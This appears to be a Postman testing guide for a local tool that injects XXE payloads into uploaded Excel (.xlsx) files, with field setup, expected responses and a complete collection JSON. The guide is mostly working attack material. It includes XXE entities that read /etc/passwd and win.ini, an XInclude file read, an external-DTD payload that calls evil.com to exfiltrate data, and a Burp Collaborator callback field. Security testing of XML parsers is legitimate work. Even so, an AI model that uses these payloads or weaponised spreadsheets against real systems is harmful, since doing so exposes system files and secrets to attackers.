# Postman File Upload Testing Guide

## Step-by-Step File Upload Test

### 1. Create New Request in Postman
- Click "New" → "Request"
- Name: "XXE File Upload Test"
- Method: **POST**
- URL: `http://localhost:5000/api/inject-xxe`

### 2. Setup Body (form-data)
Go to **Body** tab → Select **form-data**

Add these 4 fields:

| Key | Type | Value |
|-----|------|-------|
| `file` | File | [Select your .xlsx file] |
| `payload_type` | Text | `doctype` |
| `payload` | Text | `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>` |
| `collaborator` | Text | `https://test.burpcollaborator.net` |

### 3. Detailed Field Setup

**Field 1: file**
- Key: `file`
- Type: Change from "Text" to "File" (dropdown)
- Value: Click "Select Files" → Choose any .xlsx file

**Field 2: payload_type**
- Key: `payload_type`
- Type: Text
- Value: `doctype`

**Field 3: payload**
- Key: `payload`
- Type: Text
- Value: `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>`

**Field 4: collaborator**
- Key: `collaborator`
- Type: Text
- Value: `https://test.burpcollaborator.net`

### 4. Send Request
Click **Send** button

## Expected Outputs

### Success Response (Status: 200 OK)
```json
{
  "success": true,
  "output_filename": "xxe_20241201_143022_sample.xlsx",
  "modified_files": [
    "xl/workbook.xml",
    "xl/sharedStrings.xml"
  ],
  "message": "Successfully injected XXE payload into 2 files"
}
```

### Error Responses

**No File Uploaded (Status: 400)**
```json
{
  "error": "No file uploaded"
}
```

**Invalid File Type (Status: 500)**
```json
{
  "success": false,
  "error": "Invalid input path"
}
```

**Server Error (Status: 500)**
```json
{
  "success": false,
  "error": "Error processing file: [specific error message]"
}
```

## Create Test XLSX File

### Method 1: Excel/LibreOffice
1. Open Excel or LibreOffice Calc
2. Add data:
   - A1: "Name"
   - B1: "Value"
   - A2: "Test"
   - B2: "Data"
3. Save as "test.xlsx"

### Method 2: Google Sheets
1. Create new sheet
2. Add some data
3. Download as "Microsoft Excel (.xlsx)"

## Alternative Payload Examples

### Simple File Read Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### Windows File Read Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<data>&xxe;</data>
```

### External DTD Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "https://evil.com/xxe.dtd">
<data>&exfil;</data>
```

## Testing Different Scenarios

### Test 1: Basic XXE Injection
- payload_type: `doctype`
- payload: Basic file read payload
- Expected: Success with modified files

### Test 2: XInclude Attack
- payload_type: `xinclude`
- payload: `<xi:include href="file:///etc/passwd" parse="text"/>`
- Expected: Success with XInclude injection

### Test 3: Invalid Payload Type
- payload_type: `invalid`
- payload: Any payload
- Expected: May still work or return error

### Test 4: Empty Payload
- payload_type: `doctype`
- payload: `` (empty)
- Expected: Success but no actual injection

## Verification Steps

### 1. Check Response
- Status should be 200 OK
- Response should contain `"success": true`
- Should have `output_filename` field

### 2. Verify File Creation
The processed file is saved in `backend/processed/` directory with name like:
`xxe_20241201_143022_sample.xlsx`

### 3. Download Processed File
Use the download endpoint:
- Method: GET
- URL: `http://localhost:5000/api/download/[output_filename]`
- Should download the modified XLSX file

## Common Issues & Solutions

### Issue: "No file uploaded"
**Solution:** Ensure file field type is set to "File", not "Text"

### Issue: "Invalid input path"
**Solution:** Use only .xlsx files, not .xls or other formats

### Issue: Connection refused
**Solution:** Ensure backend is running: `python app.py`

### Issue: 500 Internal Server Error
**Solution:** Check backend console for detailed error messages

## Complete Postman Collection JSON

```json
{
  "info": {
    "name": "XXE File Upload",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "item": [
    {
      "name": "Upload XLSX with XXE",
      "request": {
        "method": "POST",
        "header": [],
        "body": {
          "mode": "formdata",
          "formdata": [
            {
              "key": "file",
              "type": "file",
              "src": []
            },
            {
              "key": "payload_type",
              "value": "doctype",
              "type": "text"
            },
            {
              "key": "payload",
              "value": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>",
              "type": "text"
            },
            {
              "key": "collaborator",
              "value": "https://test.burpcollaborator.net",
              "type": "text"
            }
          ]
        },
        "url": {
          "raw": "http://localhost:5000/api/inject-xxe",
          "protocol": "http",
          "host": ["localhost"],
          "port": "5000",
          "path": ["api", "inject-xxe"]
        }
      }
    }
  ]
}
```